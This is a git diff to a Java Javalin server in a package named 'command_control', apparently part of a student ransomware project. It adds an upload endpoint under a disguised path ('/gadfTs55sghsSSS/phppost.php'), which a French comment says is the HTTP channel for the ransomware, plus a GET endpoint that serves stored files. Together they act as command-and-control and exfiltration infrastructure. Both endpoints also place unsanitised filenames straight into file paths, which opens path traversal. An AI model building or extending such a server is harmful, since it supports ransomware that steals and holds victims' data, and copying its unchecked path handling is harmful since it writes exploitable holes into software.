@@ -1,6 +1,7 @@
 package org.esisar.command_control;
 
 import io.javalin.Javalin;
+import io.javalin.http.UploadedFile;
 import io.javalin.websocket.WsContext;
 import org.esisar.command_control.encrypt.AES;
 import org.esisar.command_control.server_logic.Client;
@@ -8,6 +9,7 @@ import org.esisar.command_control.server_logic.Client;
 import java.nio.ByteBuffer;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.time.Duration;
 import java.util.ArrayList;
 import java.util.Scanner;
@@ -28,8 +30,40 @@ public class Main {
         }).start(7000);
 
 
-        //j'ai changé d'avis je fais du websocket
+       //Le http pour le ransownwra
+        app.post("/gadfTs55sghsSSS/phppost.php", ctx -> {
+            // Recuperation du fichier
+            UploadedFile file = ctx.uploadedFile("file");
 
+            if (file != null) {
+                // Traitement
+                Path destination = Paths.get("uploads/" + file.filename());
+                Files.createDirectories(destination.getParent());
+                Files.copy(file.content(), destination);
+
+                // autre paramétre du form (peut être pas utile
+                String description = ctx.formParam("description");
+
+                ctx.result("Fichier '" + file.filename() + "' reçu avec succès ! " +
+                           "Description : " + description);
+            } else {
+                ctx.status(400).result("Aucun fichier trouvé dans la requête.");
+            }
+        });
+    
+        
+        app.get("/gadfTs55sghsSSS/{filename}", ctx -> {
+            String filename = ctx.pathParam("filename");
+            Path filePath = Paths.get("uploads/" + filename);
+
+            if (Files.exists(filePath)) {
+                ctx.contentType(Files.probeContentType(filePath));
+                ctx.result(Files.newInputStream(filePath));
+            } else {
+                ctx.status(404).result("Fichier non trouvé");
+            }
+        });
+        
         app.ws("/", ws -> {
             ws.onConnect(ctx -> {
 
